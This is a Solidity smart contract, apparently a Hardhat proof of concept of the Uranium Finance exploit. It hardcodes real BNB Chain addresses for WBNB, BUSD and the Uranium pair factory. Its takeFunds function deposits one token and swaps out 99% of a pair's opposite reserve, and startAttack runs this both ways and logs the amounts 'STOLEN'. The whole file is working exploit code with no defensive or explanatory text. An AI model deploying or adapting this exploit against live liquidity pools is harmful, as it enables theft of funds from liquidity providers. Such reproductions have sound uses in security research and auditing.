pragma solidity >=0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol";
import "hardhat/console.sol";

interface IWrappedNative {
    function deposit() external payable;
}

contract Uranium is Ownable {
    constructor() public {}
    receive() external payable {}
    fallback() external payable {}
    address private constant wbnb               = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private constant busd               = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
    address private constant uraniumFactory      = 0xA943eA143cd7E79806d670f4a7cf08F8922a454F;

    function wrap() internal {
        IWrappedNative(wbnb).deposit{value: address(this).balance}();
        console.log("WBNB start : ", IERC20(wbnb).balanceOf(address(this)));
    }

    function takeFunds(address token0, address token1, uint amount) internal {
        IUniswapV2Factory factory = IUniswapV2Factory(uraniumFactory);
        IUniswapV2Pair pair = IUniswapV2Pair(factory.getPair(address(token1), address(token0)));

        IERC20(token0).transfer(address(pair), amount);
        uint amountOut = (IERC20(token1).balanceOf(address(pair)) * 99) / 100;

        pair.swap(
            pair.token0() == address(token1) ? amountOut : 0,
            pair.token0() == address(token1) ? 0 : amountOut,
            address(this),
            new bytes(0)
        );
    }

    function startAttack() public payable {
        wrap();
        takeFunds(wbnb, busd, 1 ether); 
        takeFunds(busd, wbnb, 1 ether); 
        console.log("BUSD STOLEN : ", IERC20(busd).balanceOf(address(this)));
        console.log("WBNB STOLEN : ", IERC20(wbnb).balanceOf(address(this)));
    }
}